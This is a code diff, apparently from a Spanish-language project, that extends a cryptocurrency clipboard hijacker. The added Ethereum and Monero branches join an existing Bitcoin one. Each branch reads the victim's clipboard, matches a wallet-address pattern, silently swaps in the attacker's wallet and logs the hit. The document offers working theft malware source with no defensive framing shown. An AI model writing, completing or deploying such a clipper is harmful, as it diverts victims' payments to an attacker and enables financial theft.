@@ -58,9 +58,25 @@ if mi_patron_btc.match(victima_portapapeles):
     print("🚨 Encontrado Wallet Bitcoin. Reemplazando... 😈")
     loguear_hallazgo(victima_portapapeles, "Wallet BTC")
 
+#1 => Revisar el portapapeles
+victima_portapapeles = pc.paste().decode("utf-8")
+#2 => Compilar la expresión regular
+mi_patron_eth = re.compile(settings.patron_wallet_eth)
+#3 => Comparar portapapeles con reglas de ETH
+if mi_patron_eth.match(victima_portapapeles):
+    pc.copy(settings.atacante_wallet_eth)
+    print("🚨 Encontrando Wallet Ethereum Remplazando... 😈")
+    loguear_hallazgo(victima_portapapeles, "wallet ETH")
 
-#TODO: Wallets ETH y XMR
-
+#1 => Revisar el portapapeles
+victima_portapapeles = pc.paste().decode("utf-8")
+#2 => Compilar la expresión regular
+mi_patron_xmr = re.compile(settings.patron_wallet_xmr)
+#3 => Comparar portapapeles con reglas de XMR
+if mi_patron_xmr.match(victima_portapapeles):
+    pc.copy(settings.atacante_wallet_xmr)
+    print("🚨 Encontrado Wallet Monero. Reemplazando... 😈")
+    loguear_hallazgo(victima_portapapeles, "Wallet XMR")
 
 #Chequear PIN
 #1 => Revisar el portapapeles
